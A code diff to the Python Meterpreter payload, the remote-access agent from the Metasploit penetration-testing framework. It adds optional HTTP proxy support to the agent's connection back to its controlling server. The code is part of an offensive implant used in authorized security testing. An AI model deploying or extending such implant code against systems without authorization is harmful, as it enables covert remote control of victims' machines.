@@ -19,7 +19,7 @@ else:
 	has_windll = hasattr(ctypes, 'windll')
 
 try:
-	urllib_imports = ['build_opener', 'install_opener', 'urlopen']
+	urllib_imports = ['ProxyHandler', 'build_opener', 'install_opener', 'urlopen']
 	if sys.version_info[0] < 3:
 		urllib = __import__('urllib2', fromlist=urllib_imports)
 	else:
@@ -49,6 +49,7 @@ DEBUGGING = False
 HTTP_COMMUNICATION_TIMEOUT = 300
 HTTP_CONNECTION_URL = None
 HTTP_EXPIRATION_TIMEOUT = 604800
+HTTP_PROXY = None
 HTTP_USER_AGENT = None
 
 PACKET_TYPE_REQUEST        = 0
@@ -326,7 +327,11 @@ class PythonMeterpreter(object):
 			self.running = True
 
 	def driver_init_http(self):
-		opener = urllib.build_opener()
+		if HTTP_PROXY:
+			proxy_handler = urllib.ProxyHandler({'http': HTTP_PROXY})
+			opener = urllib.build_opener(proxy_handler)
+		else:
+			opener = urllib.build_opener()
 		if HTTP_USER_AGENT:
 			opener.addheaders = [('User-Agent', HTTP_USER_AGENT)]
 		urllib.install_opener(opener)
